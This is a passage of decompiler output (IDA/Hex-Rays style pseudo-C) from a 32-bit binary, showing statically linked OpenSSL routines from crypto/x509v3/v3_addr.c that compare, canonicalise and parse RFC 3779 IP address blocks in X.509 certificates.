        if ( (_WORD)Src == *(_WORD *)v7 && (v4 <= 2 || BYTE2(Src) == *(_BYTE *)(v7 + 2)) )
          return (int *)v6;
      }
      if ( ++v5 >= sub_426A30((int)a1) )
        goto LABEL_12;
    }
  }
}
// 451E55: conditional instruction was optimized away because edi.4 is in (2..3)
// 451E6D: conditional instruction was optimized away because eax.4 is in (2..3)
// 451E7C: conditional instruction was optimized away because eax.4 is in (2..3)
// 451DE7: variable 'v2' is possibly undefined

//----- (00451F40) --------------------------------------------------------
int __cdecl sub_451F40(int *a1, int Src)
{
  int *v2; // eax
  int *v3; // esi
  _DWORD *v4; // eax

  v2 = sub_451DD0(a1, Src);
  v3 = v2;
  if ( v2 )
  {
    v4 = (_DWORD *)v2[1];
    if ( v4 )
    {
      if ( *v4 != 1 || !v4[1] )
      {
        if ( *v4 )
        {
          if ( v4[1] )
          {
LABEL_10:
            *(_DWORD *)v3[1] = 0;
            return 1;
          }
        }
        else if ( v4[1] )
        {
          return 1;
        }
        *(_DWORD *)(v3[1] + 4) = sub_42C580();
        if ( *(_DWORD *)(v3[1] + 4) )
          goto LABEL_10;
      }
    }
  }
  return 0;
}

//----- (00451FC0) --------------------------------------------------------
_DWORD *__usercall sub_451FC0@<eax>(int a1@<ebx>, int *a2)
{
  int *v2; // eax
  int *v3; // edi
  _DWORD *v4; // eax
  _DWORD *result; // eax
  _DWORD *v6; // esi
  int v7; // [esp+0h] [ebp-8h]

  v2 = sub_451DD0(a2, v7);
  v3 = v2;
  if ( !v2 )
    return 0;
  v4 = (_DWORD *)v2[1];
  if ( !v4 || !*v4 && v4[1] )
    return 0;
  if ( *v4 != 1 || (result = (_DWORD *)v4[1]) == 0 )
  {
    result = sub_426AF0();
    v6 = result;
    if ( result )
    {
      if ( a1 == 1 )
      {
        sub_426840((int)result, (int)sub_451920);
      }
      else if ( a1 == 2 )
      {
        sub_426840((int)result, (int)sub_451940);
      }
      *(_DWORD *)v3[1] = 1;
      *(_DWORD *)(v3[1] + 4) = v6;
      return v6;
    }
  }
  return result;
}
// 451FC7: variable 'v7' is possibly undefined

//----- (00452040) --------------------------------------------------------
int __cdecl sub_452040(int *a1, int a2, int a3, void *Src)
{
  int *v4; // esi
  int v5; // edi
  int v7; // [esp+8h] [ebp-4h] BYREF

  v4 = sub_451FC0(a2, a1);
  if ( !v4 || !sub_451B50(&v7, Src) )
    return 0;
  v5 = v7;
  if ( sub_4269B0(v4, v7) )
    return 1;
  sub_42FEF0(v5, (int)&unk_50E994);
  return 0;
}

//----- (004520C0) --------------------------------------------------------
int __cdecl sub_4520C0(int *a1, int a2, int a3, char *Src, unsigned __int8 *a5)
{
  int v5; // ebx
  int *v6; // esi
  int v7; // ecx
  int v9; // edi

  v5 = a2;
  v6 = sub_451FC0(a2, a1);
  if ( v5 == 1 )
  {
    v7 = 4;
  }
  else if ( v5 == 2 )
  {
    v7 = 16;
  }
  else
  {
    v7 = 0;
  }
  if ( !v6 || !sub_451C10(v7, Src, &a2, a5) )
    return 0;
  v9 = a2;
  if ( sub_4269B0(v6, a2) )
    return 1;
  sub_42FEF0(v9, (int)&unk_50E994);
  return 0;
}

//----- (00452150) --------------------------------------------------------
int __usercall sub_452150@<eax>(char *a1@<ecx>, int a2@<esi>, char *a3, int a4)
{
  int v4; // ecx

  if ( a2 && a1 && a3 )
  {
    if ( *(_DWORD *)a2 )
    {
      if ( *(_DWORD *)a2 == 1 && sub_451160(**(_DWORD **)(a2 + 4), 0, a1, a4) )
      {
        v4 = *(_DWORD *)(*(_DWORD *)(a2 + 4) + 4);
        goto LABEL_8;
      }
    }
    else if ( sub_451160(*(_DWORD *)(a2 + 4), 0, a1, a4) )
    {
      v4 = *(_DWORD *)(a2 + 4);
LABEL_8:
      if ( sub_451160(v4, 0xFFu, a3, a4) )
        return 1;
    }
    return 0;
  }
  return 0;
}

//----- (004521D0) --------------------------------------------------------
int __cdecl sub_4521D0(unsigned int ***a1, unsigned int ***a2)
{
  unsigned int *v2; // eax
  unsigned int *v3; // ecx
  unsigned int v4; // ebx
  unsigned int v5; // edi
  unsigned int v6; // esi
  unsigned __int8 *v7; // ecx
  unsigned __int8 *v8; // edx
  int v9; // eax
  int result; // eax

  v2 = **a1;
  v3 = **a2;
  v4 = *v3;
  v5 = *v2;
  v6 = *v2;
  if ( (int)*v2 > (int)*v3 )
    v6 = *v3;
  v7 = (unsigned __int8 *)v3[2];
  v8 = (unsigned __int8 *)v2[2];
  if ( v6 < 4 )
  {
LABEL_6:
    if ( !v6 )
      goto LABEL_15;
  }
  else
  {
    while ( *(_DWORD *)v8 == *(_DWORD *)v7 )
    {
      v6 -= 4;
      v7 += 4;
      v8 += 4;
      if ( v6 < 4 )
        goto LABEL_6;
    }
  }
  v9 = *v8 - *v7;
  if ( v9 )
    goto LABEL_14;
  if ( v6 <= 1 )
    goto LABEL_15;
  v9 = v8[1] - v7[1];
  if ( v9 )
    goto LABEL_14;
  if ( v6 <= 2 )
    goto LABEL_15;
  v9 = v8[2] - v7[2];
  if ( v9 )
  {
LABEL_14:
    result = (v9 >> 31) | 1;
    goto LABEL_16;
  }
  if ( v6 > 3 )
  {
    v9 = v8[3] - v7[3];
    goto LABEL_14;
  }
LABEL_15:
  result = 0;
LABEL_16:
  if ( !result )
    return v5 - v4;
  return result;
}

//----- (00452270) --------------------------------------------------------
int __cdecl sub_452270(int *a1)
{
  int *v1; // ebx
  int v3; // esi
  unsigned int **v4; // eax
  int *v5; // eax
  int v6; // ecx
  int v7; // ecx
  int v8; // ecx
  unsigned int v9; // edi
  _DWORD *v10; // ecx
  int *v11; // ebp
  int v12; // esi
  int v13; // ebx
  unsigned int v14; // esi
  char *v15; // ecx
  unsigned __int8 *v16; // edx
  int v17; // eax
  unsigned int v18; // esi
  unsigned __int8 *v19; // ecx
  unsigned __int8 *v20; // edx
  int v21; // eax
  unsigned int v22; // esi
  char *v23; // ecx
  char *v24; // edx
  int v25; // eax
  int i; // ecx
  char v27; // al
  unsigned int v28; // esi
  char *v29; // ecx
  unsigned __int8 *v30; // edx
  int v31; // eax
  int v32; // eax
  _DWORD *v33; // eax
  unsigned int v34; // esi
  unsigned __int8 *v35; // ecx
  unsigned __int8 *v36; // edx
  int v37; // eax
  unsigned int **v38; // esi
  unsigned int **v39; // [esp+4h] [ebp-54h] BYREF
  unsigned int **v40; // [esp+8h] [ebp-50h] BYREF
  int *v41; // [esp+Ch] [ebp-4Ch]
  int v42; // [esp+10h] [ebp-48h]
  unsigned __int8 v43[16]; // [esp+14h] [ebp-44h] BYREF
  unsigned __int8 v44[16]; // [esp+24h] [ebp-34h] BYREF
  char v45[16]; // [esp+34h] [ebp-24h] BYREF
  char v46[16]; // [esp+44h] [ebp-14h] BYREF

  v1 = a1;
  v41 = a1;
  if ( !a1 )
    return 1;
  v3 = 0;
  if ( sub_426A30((int)a1) - 1 <= 0 )
  {
LABEL_6:
    v39 = 0;
    if ( sub_426A30((int)a1) <= 0 )
      return 1;
    while ( 1 )
    {
      v5 = (int *)sub_426A40(v1, (int)v39);
      if ( v5 && (v6 = *v5) != 0 && *(_DWORD *)(v6 + 8) )
        v7 = (**(unsigned __int8 **)(v6 + 8) << 8) | *(unsigned __int8 *)(*(_DWORD *)(v6 + 8) + 1);
      else
        v7 = 0;
      v8 = v7 - 1;
      if ( v8 )
      {
        if ( v8 == 1 )
          v9 = 16;
        else
          v9 = 0;
      }
      else
      {
        v9 = 4;
      }
      if ( !v5 )
        return 0;
      v10 = (_DWORD *)v5[1];
      if ( !v10 )
        return 0;
      if ( *v10 )
      {
        if ( *v10 != 1 )
          return 0;
        v11 = (int *)v10[1];
        if ( !sub_426A30((int)v11) )
          return 0;
        v12 = 0;
        if ( sub_426A30((int)v11) - 1 > 0 )
        {
          while ( 1 )
          {
            v40 = (unsigned int **)sub_426A40(v11, v12);
            v42 = v12 + 1;
            v13 = sub_426A40(v11, v12 + 1);
            if ( !sub_452150((char *)v43, (int)v40, (char *)v44, v9) || !sub_452150(v45, v13, v46, v9) )
              return 0;
            v14 = v9;
            v15 = v45;
            v16 = v43;
            if ( v9 < 4 )
            {
LABEL_29:
              if ( !v14 )
                return 0;
            }
            else
            {
              while ( *(_DWORD *)v16 == *(_DWORD *)v15 )
              {
                v14 -= 4;
                v15 += 4;
                v16 += 4;
                if ( v14 < 4 )
                  goto LABEL_29;
              }
            }
            v17 = *v16 - (unsigned __int8)*v15;
            if ( !v17 )
            {
              if ( v14 <= 1 )
                return 0;
              v17 = v16[1] - (unsigned __int8)v15[1];
              if ( !v17 )
              {
                if ( v14 <= 2 )
                  return 0;
                v17 = v16[2] - (unsigned __int8)v15[2];
                if ( !v17 )
                {
                  if ( v14 <= 3 )
                    return 0;
                  v17 = v16[3] - (unsigned __int8)v15[3];
                }
              }
            }
            if ( v17 >= 0 )
              return 0;
            v18 = v9;
            v19 = v44;
            v20 = v43;
            if ( v9 < 4 )
            {
LABEL_41:
              if ( !v18 )
                goto LABEL_50;
            }
            else
            {
              while ( *(_DWORD *)v20 == *(_DWORD *)v19 )
              {
                v18 -= 4;
                v19 += 4;
                v20 += 4;
                if ( v18 < 4 )
                  goto LABEL_41;
              }
            }
            v21 = *v20 - *v19;
            if ( !v21 )
            {
              if ( v18 <= 1 )
                goto LABEL_50;
              v21 = v20[1] - v19[1];
              if ( !v21 )
              {
                if ( v18 <= 2 )
                  goto LABEL_50;
                v21 = v20[2] - v19[2];
                if ( !v21 )
                {
                  if ( v18 <= 3 )
                    goto LABEL_50;
                  v21 = v20[3] - v19[3];
                }
              }
            }
            if ( ((v21 >> 31) | 1) > 0 )
              return 0;
LABEL_50:
            v22 = v9;
            v23 = v46;
            v24 = v45;
            if ( v9 < 4 )
            {
LABEL_53:
              if ( !v22 )
                goto LABEL_62;
            }
            else
            {
              while ( *(_DWORD *)v24 == *(_DWORD *)v23 )
              {
                v22 -= 4;
                v23 += 4;
                v24 += 4;
                if ( v22 < 4 )
                  goto LABEL_53;
              }
            }
            v25 = (unsigned __int8)*v24 - (unsigned __int8)*v23;
            if ( v25 )
              goto LABEL_61;
            if ( v22 > 1 )
            {
              v25 = (unsigned __int8)v24[1] - (unsigned __int8)v23[1];
              if ( v25 )
                goto LABEL_61;
              if ( v22 > 2 )
              {
                v25 = (unsigned __int8)v24[2] - (unsigned __int8)v23[2];
                if ( v25 )
                  goto LABEL_61;
                if ( v22 > 3 )
                {
                  v25 = (unsigned __int8)v24[3] - (unsigned __int8)v23[3];
LABEL_61:
                  if ( ((v25 >> 31) | 1) > 0 )
                    return 0;
                }
              }
            }
LABEL_62:
            for ( i = v9 - 1; i >= 0; --i )
            {
              v27 = v45[i];
              v45[i] = v27 - 1;
              if ( v27 )
                break;
            }
            v28 = v9;
            v29 = v45;
            v30 = v44;
            if ( v9 < 4 )
            {
LABEL_68:
              if ( !v28 )
                return 0;
            }
            else
            {
              while ( *(_DWORD *)v30 == *(_DWORD *)v29 )
              {
                v28 -= 4;
                v29 += 4;
                v30 += 4;
                if ( v28 < 4 )
                  goto LABEL_68;
              }
            }
            v31 = *v30 - (unsigned __int8)*v29;
            if ( !v31 )
            {
              if ( v28 <= 1 )
                return 0;
              v31 = v30[1] - (unsigned __int8)v29[1];
              if ( !v31 )
              {
                if ( v28 <= 2 )
                  return 0;
                v31 = v30[2] - (unsigned __int8)v29[2];
                if ( !v31 )
                {
                  if ( v28 <= 3 )
                    return 0;
                  v31 = v30[3] - (unsigned __int8)v29[3];
                }
              }
            }
            if ( v31 >= 0 || *v40 == (unsigned int *)1 && sub_451960(v9, v43, v44) >= 0 )
              return 0;
            v12 = v42;
            if ( v12 >= sub_426A30((int)v11) - 1 )
            {
              v1 = v41;
              break;
            }
          }
        }
        v32 = sub_426A30((int)v11);
        v33 = (_DWORD *)sub_426A40(v11, v32 - 1);
        if ( v33 )
        {
          if ( *v33 == 1 )
            break;
        }
      }
LABEL_97:
      v39 = (unsigned int **)((char *)v39 + 1);
      v38 = v39;
      if ( (int)v38 >= sub_426A30((int)v1) )
        return 1;
    }
    if ( !sub_452150((char *)v43, (int)v33, (char *)v44, v9) )
      return 0;
    v34 = v9;
    v35 = v44;
    v36 = v43;
    if ( v9 < 4 )
    {
LABEL_87:
      if ( !v34 )
        goto LABEL_96;
    }
    else
    {
      while ( *(_DWORD *)v36 == *(_DWORD *)v35 )
      {
        v34 -= 4;
        v35 += 4;
        v36 += 4;
        if ( v34 < 4 )
          goto LABEL_87;
      }
    }
    v37 = *v36 - *v35;
    if ( !v37 )
    {
      if ( v34 <= 1 )
        goto LABEL_96;
      v37 = v36[1] - v35[1];
      if ( !v37 )
      {
        if ( v34 <= 2 )
          goto LABEL_96;
        v37 = v36[2] - v35[2];
        if ( !v37 )
        {
          if ( v34 <= 3 )
            goto LABEL_96;
          v37 = v36[3] - v35[3];
        }
      }
    }
    if ( ((v37 >> 31) | 1) > 0 )
      return 0;
LABEL_96:
    if ( sub_451960(v9, v43, v44) >= 0 )
      return 0;
    goto LABEL_97;
  }
  while ( 1 )
  {
    v4 = (unsigned int **)sub_426A40(a1, v3++);
    v39 = v4;
    v40 = (unsigned int **)sub_426A40(a1, v3);
    if ( sub_4521D0(&v39, &v40) >= 0 )
      return 0;
    if ( v3 >= sub_426A30((int)a1) - 1 )
      goto LABEL_6;
  }
}
// 452270: using guessed type char var_24[16];

//----- (00452760) --------------------------------------------------------
BOOL __cdecl sub_452760(int *a1, int a2)
{
  unsigned int v2; // edi
  int v3; // esi
  int v4; // ebx
  unsigned int v5; // esi
  char *v6; // ecx
  char *v7; // edx
  int v8; // eax
  unsigned int v9; // esi
  unsigned __int8 *v10; // ecx
  char *v11; // edx
  int v12; // eax
  unsigned int v13; // esi
  char *v14; // ecx
  char *v15; // edx
  int v16; // eax
  int i; // ecx
  char v18; // al
  unsigned int v19; // eax
  char *v20; // ecx
  char *v21; // esi
  int v22; // esi
  int v23; // eax
  _DWORD *v24; // eax
  unsigned int v25; // esi
  char *v26; // ecx
  unsigned __int8 *v27; // edx
  int v28; // eax
  int v30; // [esp+10h] [ebp-58h]
  int v31; // [esp+14h] [ebp-54h]
  int v32; // [esp+1Ch] [ebp-4Ch]
  int v33; // [esp+20h] [ebp-48h] BYREF
  char v34[16]; // [esp+24h] [ebp-44h] BYREF
  unsigned __int8 v35[16]; // [esp+34h] [ebp-34h] BYREF
  char Src[16]; // [esp+44h] [ebp-24h] BYREF
  char v37[16]; // [esp+54h] [ebp-14h] BYREF

  if ( a2 == 1 )
  {
    v2 = 4;
  }
  else if ( a2 == 2 )
  {
    v2 = 16;
  }
  else
  {
    v2 = 0;
  }
  sub_426A90((int)a1);
  v3 = 0;
  v31 = 0;
  if ( sub_426A30((int)a1) - 1 > 0 )
  {
    v30 = 1;
    do
    {
      v32 = sub_426A40(a1, v3);
      v4 = sub_426A40(a1, v30);
      if ( !sub_452150(Src, v32, v37, v2) || !sub_452150(v34, v4, (char *)v35, v2) )
        return 0;
      v5 = v2;
      v6 = v37;
      v7 = Src;
      if ( v2 < 4 )
      {
LABEL_13:
        if ( !v5 )
          goto LABEL_22;
      }
      else
      {
        while ( *(_DWORD *)v7 == *(_DWORD *)v6 )
        {
          v5 -= 4;
          v6 += 4;
          v7 += 4;
          if ( v5 < 4 )
            goto LABEL_13;
        }
      }
      v8 = (unsigned __int8)*v7 - (unsigned __int8)*v6;
      if ( !v8 )
      {
        if ( v5 <= 1 )
          goto LABEL_22;
        v8 = (unsigned __int8)v7[1] - (unsigned __int8)v6[1];
        if ( !v8 )
        {
          if ( v5 <= 2 )
            goto LABEL_22;
          v8 = (unsigned __int8)v7[2] - (unsigned __int8)v6[2];
          if ( !v8 )
          {
            if ( v5 <= 3 )
              goto LABEL_22;
            v8 = (unsigned __int8)v7[3] - (unsigned __int8)v6[3];
          }
        }
      }
      if ( ((v8 >> 31) | 1) > 0 )
        return 0;
LABEL_22:
      v9 = v2;
      v10 = v35;
      v11 = v34;
      if ( v2 < 4 )
      {
LABEL_25:
        if ( !v9 )
          goto LABEL_34;
      }
      else
      {
        while ( *(_DWORD *)v11 == *(_DWORD *)v10 )
        {
          v9 -= 4;
          v10 += 4;
          v11 += 4;
          if ( v9 < 4 )
            goto LABEL_25;
        }
      }
      v12 = (unsigned __int8)*v11 - *v10;
      if ( !v12 )
      {
        if ( v9 <= 1 )
          goto LABEL_34;
        v12 = (unsigned __int8)v11[1] - v10[1];
        if ( !v12 )
        {
          if ( v9 <= 2 )
            goto LABEL_34;
          v12 = (unsigned __int8)v11[2] - v10[2];
          if ( !v12 )
          {
            if ( v9 <= 3 )
              goto LABEL_34;
            v12 = (unsigned __int8)v11[3] - v10[3];
          }
        }
      }
      if ( ((v12 >> 31) | 1) > 0 )
        return 0;
LABEL_34:
      v13 = v2;
      v14 = v34;
      v15 = v37;
      if ( v2 < 4 )
      {
LABEL_37:
        if ( !v13 )
          return 0;
      }
      else
      {
        while ( *(_DWORD *)v15 == *(_DWORD *)v14 )
        {
          v13 -= 4;
          v14 += 4;
          v15 += 4;
          if ( v13 < 4 )
            goto LABEL_37;
        }
      }
      v16 = (unsigned __int8)*v15 - (unsigned __int8)*v14;
      if ( !v16 )
      {
        if ( v13 <= 1 )
          return 0;
        v16 = (unsigned __int8)v15[1] - (unsigned __int8)v14[1];
        if ( !v16 )
        {
          if ( v13 <= 2 )
            return 0;
          v16 = (unsigned __int8)v15[2] - (unsigned __int8)v14[2];
          if ( !v16 )
          {
            if ( v13 <= 3 )
              return 0;
            v16 = (unsigned __int8)v15[3] - (unsigned __int8)v14[3];
          }
        }
      }
      if ( v16 >= 0 )
        return 0;
      for ( i = v2 - 1; i >= 0; --i )
      {
        v18 = v34[i];
        v34[i] = v18 - 1;
        if ( v18 )
          break;
      }
      v19 = v2;
      v20 = v34;
      v21 = v37;
      if ( v2 < 4 )
      {
LABEL_52:
        if ( !v19 || *v20 == *v21 && (v19 <= 1 || v20[1] == v21[1] && (v19 <= 2 || v20[2] == v21[2])) )
        {
          if ( !sub_451C10(v2, Src, &v33, v35) )
            return 0;
          sub_426A60(a1, v31, v33);
          sub_426960(a1, v30);
          sub_451100(v32);
          sub_451100(v4);
          v22 = v31 - 1;
          --v30;
          goto LABEL_61;
        }
      }
      else
      {
        while ( *(_DWORD *)v21 == *(_DWORD *)v20 )
        {
          v19 -= 4;
          v20 += 4;
          v21 += 4;
          if ( v19 < 4 )
            goto LABEL_52;
        }
      }
      v22 = v31;
LABEL_61:
      ++v30;
      v3 = v22 + 1;
      v31 = v3;
    }
    while ( v3 < sub_426A30((int)a1) - 1 );
  }
  v23 = sub_426A30((int)a1);
  v24 = (_DWORD *)sub_426A40(a1, v23 - 1);
  if ( !v24 || *v24 != 1 )
    return 1;
  if ( !sub_452150((char *)v35, (int)v24, Src, v2) )
    return 0;
  v25 = v2;
  v26 = Src;
  v27 = v35;
  if ( v2 < 4 )
  {
LABEL_68:
    if ( !v25 )
      return 1;
  }
  else
  {
    while ( *(_DWORD *)v27 == *(_DWORD *)v26 )
    {
      v25 -= 4;
      v26 += 4;
      v27 += 4;
      if ( v25 < 4 )
        goto LABEL_68;
    }
  }
  v28 = *v27 - (unsigned __int8)*v26;
  if ( v28 )
    return ((v28 >> 31) | 1) <= 0;
  if ( v25 <= 1 )
    return 1;
  v28 = v27[1] - (unsigned __int8)v26[1];
  if ( v28 )
    return ((v28 >> 31) | 1) <= 0;
  if ( v25 <= 2 )
    return 1;
  v28 = v27[2] - (unsigned __int8)v26[2];
  if ( v28 )
    return ((v28 >> 31) | 1) <= 0;
  if ( v25 <= 3 )
    return 1;
  v28 = v27[3] - (unsigned __int8)v26[3];
  return ((v28 >> 31) | 1) <= 0;
}
// 452760: using guessed type char var_44[16];

//----- (00452B30) --------------------------------------------------------
int __cdecl sub_452B30(int *a1)
{
  int v1; // esi
  int *v2; // eax
  int v3; // edx
  int v4; // eax
  int v5; // eax

  v1 = 0;
  if ( sub_426A30((int)a1) <= 0 )
  {
LABEL_9:
    sub_426840((int)a1, (int)sub_4521D0);
    sub_426A90((int)a1);
    if ( !sub_452270(a1) )
      sub_417C70("assertion failed: X509v3_addr_is_canonical(addr)", "crypto\\x509v3\\v3_addr.c", 878);
    return 1;
  }
  else
  {
    while ( 1 )
    {
      v2 = (int *)sub_426A40(a1, v1);
      v3 = v2[1];
      if ( *(_DWORD *)v3 == 1 )
      {
        v4 = *v2;
        if ( v4 && *(_DWORD *)(v4 + 8) )
          v5 = (**(unsigned __int8 **)(v4 + 8) << 8) | *(unsigned __int8 *)(*(_DWORD *)(v4 + 8) + 1);
        else
          v5 = 0;
        if ( !sub_452760(*(int **)(v3 + 4), v5) )
          return 0;
      }
      if ( ++v1 >= sub_426A30((int)a1) )
        goto LABEL_9;
    }
  }
}

//----- (00452BE0) --------------------------------------------------------
void *__cdecl sub_452BE0(int a1, int a2, int a3)
{
  int *v3; // esi
  char *v4; // ebp
  int *v6; // edi
  char *v7; // ebx
  unsigned int v8; // esi
  size_t v9; // eax
  char *v10; // ecx
  char v11; // dl
  char *v12; // ecx
  size_t v13; // eax
  const char *v14; // eax
  size_t v15; // edi
  char *v16; // ebx
  size_t v17; // esi
  int v18; // edi
  size_t v19; // esi
  int v20; // eax
  int v21; // ebx
  int v22; // edi
  const char *v23; // esi
  size_t v24; // edi
  size_t v25; // eax
  int v26; // edi
  unsigned int v27; // eax
  int *v28; // edx
  int *v29; // esi
  int v30; // ecx
  int v31; // edi
  void *v32; // esi
  int v33; // ecx
  int v34; // edx
  int v35; // eax
  char *v36; // [esp-1Ch] [ebp-70h]
  char *v37; // [esp-18h] [ebp-6Ch]
  char *EndPtr; // [esp+8h] [ebp-4Ch] BYREF
  int Src; // [esp+Ch] [ebp-48h]
  int v40; // [esp+10h] [ebp-44h]
  int *v41; // [esp+14h] [ebp-40h]
  void *Block; // [esp+18h] [ebp-3Ch]
  char *Control; // [esp+1Ch] [ebp-38h]
  int v44; // [esp+20h] [ebp-34h]
  int v45; // [esp+24h] [ebp-30h]
  int *v46; // [esp+28h] [ebp-2Ch]
  char v47; // [esp+2Ch] [ebp-28h] BYREF
  char v48[16]; // [esp+30h] [ebp-24h] BYREF
  unsigned __int8 v49[16]; // [esp+40h] [ebp-14h] BYREF

  v3 = (int *)a3;
  v46 = (int *)a3;
  v4 = 0;
  Block = sub_426860((int)sub_4521D0);
  if ( !Block )
  {
    sub_408310(34, 159, 65, (int)"crypto\\x509v3\\v3_addr.c", 896);
    return 0;
  }
  v45 = 0;
  if ( sub_426A30(a3) > 0 )
  {
    do
    {
      v6 = (int *)sub_426A40(v3, v45);
      v7 = 0;
      v37 = (char *)v6[1];
      v41 = v6;
      v40 = 0;
      Control = 0;
      if ( !sub_44D6A0(v37, "IPv4") )
      {
        Src = 1;
        goto LABEL_12;
      }
      if ( sub_44D6A0((char *)v6[1], "IPv6") )
      {
        if ( !sub_44D6A0((char *)v6[1], "IPv4-SAFI") )
        {
          Src = 1;
          v40 = (int)&v47;
          v7 = &v47;
          goto LABEL_12;
        }
        if ( sub_44D6A0((char *)v6[1], "IPv6-SAFI") )
        {
          sub_408310(34, 159, 115, (int)"crypto\\x509v3\\v3_addr.c", 919);
          v33 = v6[2];
          v34 = v6[1];
          v35 = *v6;
LABEL_70:
          sub_408610(6, "section:", v35, ",name:", v34, ",value:", v33);
LABEL_56:
          sub_413490(v4);
          sub_426C00(Block, sub_451120);
          return 0;
        }
        v40 = (int)&v47;
        v7 = &v47;
      }
      Src = 2;
LABEL_12:
      if ( Src == 1 )
        Control = "0123456789.";
      else
        Control = "0123456789.:abcdefABCDEF";
      if ( Src == 1 )
        v44 = 4;
      else
        v44 = 16;
      if ( v7 )
      {
        v8 = strtoul((const char *)v6[2], &EndPtr, 0);
        v36 = EndPtr;
        *(_DWORD *)v7 = v8;
        v9 = strspn(v36, " \t");
        v10 = &EndPtr[v9];
        EndPtr += v9;
        if ( v8 > 0xFF || (v11 = *v10, v12 = v10 + 1, EndPtr = v12, v11 != 58) )
        {
          sub_408310(34, 159, 164, (int)"crypto\\x509v3\\v3_addr.c", 943);
LABEL_58:
          sub_408610(6, "section:", *v6, ",name:", v6[1], ",value:", v6[2]);
          goto LABEL_56;
        }
        v13 = strspn(v12, " \t");
        EndPtr += v13;
        v14 = (const char *)sub_4247B0(EndPtr);
        v3 = v46;
      }
      else
      {
        v14 = (const char *)sub_4247B0((const char *)v6[2]);
      }
      v4 = (char *)v14;
      if ( !v14 )
      {
        sub_408310(34, 159, 65, (int)"crypto\\x509v3\\v3_addr.c", 953);
        goto LABEL_56;
      }
      if ( strcmp(v14, "inherit") )
      {
        v15 = strspn(v4, Control);
        v16 = &v4[v15];
        v17 = v15 + strspn(&v4[v15], " \t");
        v18 = v4[v17];
        v19 = v17 + 1;
        *v16 = 0;
        v20 = sub_44DC80(v48, v4);
        v21 = v44;
        if ( v20 != v44 )
        {
          sub_408310(34, 159, 166, (int)"crypto\\x509v3\\v3_addr.c", 979);
LABEL_62:
          v33 = v41[2];
          v34 = v41[1];
          v35 = *v41;
          goto LABEL_70;
        }
        if ( v18 )
        {
          v22 = v18 - 45;
          if ( v22 )
          {
            if ( v22 != 2 )
            {
              sub_408310(34, 159, 116, (int)"crypto\\x509v3\\v3_addr.c", 1032);
              goto LABEL_62;
            }
            v23 = &v4[v19];
            strtoul(v23, &EndPtr, 10);
            if ( EndPtr == v23 || *EndPtr )
            {
              sub_408310(34, 159, 116, (int)"crypto\\x509v3\\v3_addr.c", 989);
              goto LABEL_62;
            }
            if ( !sub_452040((int *)Block, Src, v40, v48) )
            {
              sub_408310(34, 159, 65, (int)"crypto\\x509v3\\v3_addr.c", 994);
              goto LABEL_56;
            }
            goto LABEL_53;
          }
          v24 = v19 + strspn(&v4[v19], " \t");
          v25 = v24 + strspn(&v4[v24], Control);
          if ( v24 == v25 || v4[v25] )
          {
            sub_408310(34, 159, 116, (int)"crypto\\x509v3\\v3_addr.c", 1003);
            goto LABEL_62;
          }
          if ( sub_44DC80(v49, &v4[v24]) != v21 )
          {
            sub_408310(34, 159, 166, (int)"crypto\\x509v3\\v3_addr.c", 1009);
            goto LABEL_62;
          }
          v26 = Src;
          v27 = sub_451140(Src);
          v28 = (int *)v49;
          v29 = (int *)v48;
          if ( v27 < 4 )
          {
LABEL_41:
            if ( v27 )
              goto LABEL_42;
          }
          else
          {
            while ( *v29 == *v28 )
            {
              v27 -= 4;
              ++v28;
              ++v29;
              if ( v27 < 4 )
                goto LABEL_41;
            }
LABEL_42:
            v30 = *(unsigned __int8 *)v29 - *(unsigned __int8 *)v28;
            if ( v30 )
              goto LABEL_49;
            if ( v27 <= 1 )
              goto LABEL_50;
            v30 = *((unsigned __int8 *)v29 + 1) - *((unsigned __int8 *)v28 + 1);
            if ( v30 )
              goto LABEL_49;
            if ( v27 <= 2 )
              goto LABEL_50;
            v30 = *((unsigned __int8 *)v29 + 2) - *((unsigned __int8 *)v28 + 2);
            if ( v30 )
            {
LABEL_49:
              if ( ((v30 >> 31) | 1) > 0 )
              {
                sub_408310(34, 159, 116, (int)"crypto\\x509v3\\v3_addr.c", 1015);
                goto LABEL_62;
              }
            }
            else if ( v27 > 3 )
            {
              v30 = *((unsigned __int8 *)v29 + 3) - *((unsigned __int8 *)v28 + 3);
              goto LABEL_49;
            }
          }
LABEL_50:
          if ( !sub_4520C0((int *)Block, v26, v40, v48, v49) )
          {
            sub_408310(34, 159, 65, (int)"crypto\\x509v3\\v3_addr.c", 1020);
            goto LABEL_56;
          }
        }
        else if ( !sub_452040((int *)Block, Src, v40, v48) )
        {
          sub_408310(34, 159, 65, (int)"crypto\\x509v3\\v3_addr.c", 1026);
          goto LABEL_56;
        }
LABEL_53:
        sub_413490(v4);
        v3 = v46;
        goto LABEL_54;
      }
      if ( !sub_451F40((int *)Block, Src) )
      {
        sub_408310(34, 159, 165, (int)"crypto\\x509v3\\v3_addr.c", 964);
        goto LABEL_58;
      }
      sub_413490(v4);
LABEL_54:
      v4 = 0;
      v31 = ++v45;
    }
    while ( v31 < sub_426A30((int)v3) );
  }
  v32 = Block;
  if ( !sub_452B30((int *)Block) )
    goto LABEL_56;
  return v32;
}
// 452D11: conditional instruction was optimized away because %Src.4==2
// 452D2F: conditional instruction was optimized away because %Src.4==2
// 452BE0: using guessed type char var_24[16];
// 452BE0: using guessed type unsigned __int8 var_14[16];

//----- (004531D0) --------------------------------------------------------
void *sub_4531D0()
{
  return &unk_50ED78;
}

//----- (004531E0) --------------------------------------------------------
void *sub_4531E0()
{
  return &unk_50EDBC;
}

//----- (004531F0) --------------------------------------------------------
void __cdecl sub_4531F0(int a1)
{
  sub_42FEF0(a1, (int)&unk_50EDBC);
}

//----- (00453210) --------------------------------------------------------
int **__cdecl sub_453210(int a1, int a2, int *a3)
{
  _DWORD **v3; // edi
  int **v4; // ebx
  int v5; // ebp
  int v6; // esi
  int v7; // eax
  int v8; // eax
  int v9; // eax
  int *v10; // eax
  int **v12; // [esp+10h] [ebp-10h]
  char v13[4]; // [esp+14h] [ebp-Ch] BYREF
  int v14; // [esp+18h] [ebp-8h]
  int v15; // [esp+1Ch] [ebp-4h]

  v3 = 0;
  v4 = (int **)sub_42FB20((int)&unk_50EDBC);
  v12 = v4;
  if ( v4 )
  {
    v5 = 0;
    if ( sub_426A30((int)a3) <= 0 )
      return v4;
    while ( 1 )
    {
      v6 = sub_426A40(a3, v5);
      if ( !strncmp(*(const char **)(v6 + 4), "permitted", 9u) && (v7 = *(_DWORD *)(v6 + 4), *(_BYTE *)(v7 + 9)) )
      {
        v8 = v7 + 10;
      }
      else
      {
